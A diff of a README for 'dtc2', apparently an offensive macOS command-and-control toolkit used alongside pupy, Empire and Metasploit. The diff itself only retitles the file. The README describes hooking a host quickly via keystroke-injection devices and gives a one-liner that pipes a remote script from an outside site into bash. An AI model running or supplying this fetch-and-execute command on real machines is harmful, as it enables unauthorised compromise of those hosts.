@@ -1,4 +1,4 @@
-# dtc2
+# dtc2 - a terrible osx toolkit
 Duct Tape Command and Control!
 This is just a compilation of scripts to help dig in a little bit and move around. It's designed to be used with tools like pupy, empire and metasploit, by adding functionality that those toolsets don't currently have, or is not easy to run in certain circumstances. It's designed to 'hook' a host by running a one-liner, so it can be deployed quickly from a keyboard, a ducky, a bash bunny, a platypus .app, or really any other way you want to run it. The easy way is like so:
 > curl -s https://haxsite.lol/launch.sh | bash 
